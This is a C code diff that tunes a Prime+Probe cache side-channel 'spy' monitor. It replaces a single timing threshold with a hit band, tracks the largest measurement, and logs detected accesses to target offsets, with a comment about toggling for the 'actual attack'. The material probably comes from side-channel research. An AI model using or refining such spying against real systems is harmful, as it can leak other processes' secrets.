@@ -167,7 +167,6 @@ void close_spy(Config *conf, Targets *targets){
 
 // Monitor target addresses.
 void my_monitor(Config *spy_conf, Targets *targets){
-    const char *output_filename = "./output_prime_probe.log";
     {
         
         int ctr=0;
@@ -192,16 +191,25 @@ void my_monitor(Config *spy_conf, Targets *targets){
             if(ctr++ >= MSRMT_BUFFER) break; // toggle for actual attack
         }
     }
-    // Write results to fileappend_output(targets, output_filename);
-    #define PP_THRESHOLD 1900
+    // Write results to file
+    const char *output_filename = "./output_prime_probe.log";
+    append_output(targets, output_filename);
+
+    #define PP_THRESHOLD_B 1100
+    #define PP_THRESHOLD_T 1500
     int *hit_ctr=malloc(targets->number*sizeof(int));
+    u64 max=0;
     for(size_t i=0; i<targets->number; i++) hit_ctr[i]=0;
     for(int j=0; j<MSRMT_BUFFER; j++){
         for(size_t i=0; i<targets->number; i++){
-            if(targets->addresses[i]->msrmts[j] > PP_THRESHOLD) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, j, ++hit_ctr[i]);
+            if(targets->addresses[i]->msrmts[j]>max && targets->addresses[i]->msrmts[j] < 10000) max =targets->addresses[i]->msrmts[j];
+            
+            if(targets->addresses[i]->msrmts[j] > PP_THRESHOLD_B && targets->addresses[i]->msrmts[j] < PP_THRESHOLD_T) printf("[i] my_monitor: detected 0x%lx: ctr %d, msrmt %lu, hit ctr %d\n", targets->addresses[i]->offset, j, targets->addresses[i]->msrmts[j], ++hit_ctr[i]);
         }
     }
-    printf("finished\n");
+
+
+    printf("finished %lu\n", max);
     close_spy(spy_conf, targets);
 }
 
